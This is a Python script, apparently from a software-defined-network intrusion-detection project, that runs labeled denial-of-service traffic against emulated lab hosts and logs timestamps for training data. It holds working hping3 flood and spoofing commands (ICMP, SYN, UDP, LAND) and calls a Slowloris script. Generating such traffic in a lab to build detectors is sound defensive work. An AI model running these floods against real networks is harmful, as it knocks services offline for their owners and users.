"""run_attack.py - Generate labeled attack traffic and log timestamps.

Usage
-----
    sudo python3 run_attack.py

Run OUTSIDE Mininet (from a host terminal or from Mininet CLI using xterm).
Generates each attack type for ATTACK_DURATION seconds with a pause between.
Writes run_attack_log.json with exact unix timestamps for automatic labeling.

IMPORTANT: Set COLLECTION_MODE = True in switch.py and monitor.py before running this.
IMPORTANT: Disable DMZ rules in switch.py before running this (comment out
           the call to _install_core_routing in switch_features_handler).
"""

import subprocess
import time
import json

ATTACK_DURATION = 200   # seconds per attack type
PAUSE           = 50    # seconds between attacks
LOG_PATH        = 'run_attack_log.json'

# Target multiple hosts to generate rich and varied flow data
# Targets:
#   192.168.10.10  = http  (DMZ)
#   192.168.20.10  = ftp   (LAN)
#   192.168.20.11  = smtp  (LAN)
#   192.168.20.12  = dns   (LAN)
#   192.168.20.101 = h1    (LAN)

ATTACKS = [
    # ------------------------------------------------------------------
    # Volume-based: ICMP flood
    # ------------------------------------------------------------------
    {
        'name': 'ICMP_flood',
        'cmds': [
            'hping3 --icmp --flood --rand-source 192.168.10.10',
            'hping3 --icmp --flood --rand-source 192.168.20.101',
            'hping3 --icmp --flood --rand-source 192.168.20.10',
        ],
    },
    # ------------------------------------------------------------------
    # Protocol-based: SYN flood
    # ------------------------------------------------------------------
    {
        'name': 'SYN_flood',
        'cmds': [
            'hping3 -S --flood --rand-source -p 80  192.168.10.10',
            'hping3 -S --flood --rand-source -p 21  192.168.20.10',
            'hping3 -S --flood --rand-source -p 25  192.168.20.11',
        ],
    },
    # ------------------------------------------------------------------
    # Volume-based: UDP flood
    # ------------------------------------------------------------------
    {
        'name': 'UDP_flood',
        'cmds': [
            'hping3 --udp --flood --rand-source -p 53  192.168.20.12',
            'hping3 --udp --flood --rand-source -p 80  192.168.10.10',
            'hping3 --udp --flood --rand-source -p 21  192.168.20.10',
        ],
    },
    # ------------------------------------------------------------------
    # Application-based: HTTP flood
    # ------------------------------------------------------------------
    {
        'name': 'HTTP_flood',
        'cmds': [
            'hping3 -S --faster --rand-source -p 80 192.168.10.10',
        ],
    },
    # ------------------------------------------------------------------
    # Protocol-based: LAND attack (spoof src = dst)
    # ------------------------------------------------------------------
    {
        'name': 'LAND_attack',
        'cmds': [
            'hping3 -S --flood --spoof 192.168.10.10  192.168.10.10  -p 80',
            'hping3 -S --flood --spoof 192.168.20.101 192.168.20.101 -p 22',
        ],
    },
    # ------------------------------------------------------------------
    # Application-based: Slowloris
    # ------------------------------------------------------------------
    {
        'name': 'SLOWLORIS',
        'cmds': [
            'python3 slowloris.py',
        ],
    },
]

log = []

for attack in ATTACKS:
    print(f'\n[+] Starting {attack["name"]}...')
    start = time.time()

    procs = []
    for cmd in attack['cmds']:
        p = subprocess.Popen(
            cmd, shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        procs.append(p)

    time.sleep(ATTACK_DURATION)

    for p in procs:
        p.terminate()
        p.wait()

    end = time.time()

    log.append({
        'attack_type': attack['name'],
        'start':       start,
        'end':         end,
    })

    print(f'    start : {start:.2f}')
    print(f'    end   : {end:.2f}')
    print(f'[+] {attack["name"]} done. Pausing {PAUSE}s ...')
    time.sleep(PAUSE)

# save log
with open(LOG_PATH, 'w') as f:
    json.dump(log, f, indent=2)

print(f'\nAttack log saved to {LOG_PATH}')